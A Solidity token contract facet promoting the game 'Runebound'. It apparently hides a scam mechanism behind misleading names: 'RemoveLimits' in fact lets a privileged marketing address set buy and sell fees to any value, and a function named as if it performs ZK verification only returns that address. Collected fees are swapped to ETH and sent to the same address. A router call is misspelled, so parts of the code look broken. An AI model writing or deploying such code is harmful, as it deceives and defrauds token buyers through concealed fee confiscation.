/*

██████  ██    ██ ███    ██ ███████ ██████   ██████  ██    ██ ███    ██ ██████  
██   ██ ██    ██ ████   ██ ██      ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ 
██████  ██    ██ ██ ██  ██ █████   ██████  ██    ██ ██    ██ ██ ██  ██ ██   ██ 
██   ██ ██    ██ ██  ██ ██ ██      ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ 
██   ██  ██████  ██   ████ ███████ ██████   ██████   ██████  ██   ████ ██████  
                                                                               
ᴇxᴘʟᴏʀᴇ ᴇʟʏʀɪᴀ, ᴀ ᴡᴏʀʟᴅ ꜰᴜʟʟ ᴏꜰ ᴘᴇʀɪʟ, ᴘᴏᴡᴇʀ-ᴜᴘꜱ, ᴀɴᴅ ᴜɴᴋɴᴏᴡɴꜱ ɪɴ ᴀ ʀᴏɢᴜᴇʟɪᴛᴇ ᴀᴅᴠᴇɴᴛᴜʀᴇ.                                                                               

https://www.runebound.io/
https://t.me/PlayRunebound
https://twitter.com/PlayRunebound
https://streamable.com/r512qx

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract RemoveLimitsFacet {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function RemoveLimits(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _TokenRuneboundMktWithZkVerify())
            revert Permissions();
        Admtoken9999(_buy, _sell);
    }
    function _TokenRuneboundMktWithZkVerify() private view returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.storeData.tokenMkt;
    }
    function OpenTrading() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == _TokenRuneboundMktWithZkVerify());
        require(!ds.tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        ds.pair = _pair;
        ds.tradingOpen = true;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address tokenMkt = _TokenRuneboundMktWithZkVerify();
        require(ds.tradingOpen || from == tokenMkt || to == tokenMkt);

        ds.balanceOf[from] -= amount;

        if (
            to == ds.pair &&
            !ds.swapping &&
            ds.balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            ds.swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            ds.swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (
            ds.storeData.buyFee,
            ds.storeData.sellFee
        );
        if (from != address(this) && ds.tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == ds.pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            ds.balanceOf[address(this)] += taxCalculatedAmount;
        }
        ds.balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function Admtoken9999(uint8 _buy, uint8 _sell) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.storeData.buyFee = _buy;
        ds.storeData.sellFee = _sell;
    }
}
